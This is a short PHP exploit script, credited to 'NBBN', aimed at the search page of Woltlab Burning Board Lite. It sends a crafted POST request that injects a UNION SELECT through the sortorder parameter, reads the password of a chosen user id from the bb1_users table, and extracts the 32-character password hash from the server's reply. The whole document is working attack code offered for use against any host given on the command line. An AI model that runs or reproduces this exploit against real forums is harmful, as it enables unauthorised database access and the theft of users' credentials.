<?php
$host = $argv[1];
$path = $argv[2];
$searchstring = $argv[3];
$userid = $argv[4];
If ($argc <= 4)
{
echo "Usage: filename.php [host] [path] [searchstring] [user-id] \n Examples:
\n php filename.php localhost /wbblite/search.php Computer 1\n php
filename.php localhost /search.php Board 1\n";
die;
}
$sqlinjecting
=
"searchstring=$searchstring&searchuser=&name_exactly=1&boardids%5B%5D=*&topiconly=0&showposts=0&searchdate=0&beforeafter=after&sortby=lastpost&sortorder=
%27%20UNION%20SELECT%20password%20FROM%20bb1_users%20WHERE%20userid=$userid%20/*&send=send&sid=&submit=Suchen";
$con = fsockopen($host, 80);
  echo("==Woltlab Burning Board LITE SQL-Injection Exploit founded and coded
by NBBN. \n\n\n");
  sleep(1);
  fputs($con, "POST $path HTTP/1.1\n");
  fputs($con, "Host: $host\n");
  fputs($con, "Content-type: application/x-www-form-urlencoded\n");
  fputs($con, "Content-length: ". strlen($sqlinjecting) ."\n");
  fputs($con, "Connection: close\n\n");
  fputs($con, "$sqlinjecting\n");

  while(!feof($con)) {
      $res .= fgets($con, 128);
  }
  echo("Well done...\n");
  fclose($con);

  echo $res;
echo "The password-hash is in search.php?searchid=[Hash]\n";
$the_hash =  substr($res,strpos($res,'searchid=')+9,32);
echo "Hash: $the_hash\n\n";
?>
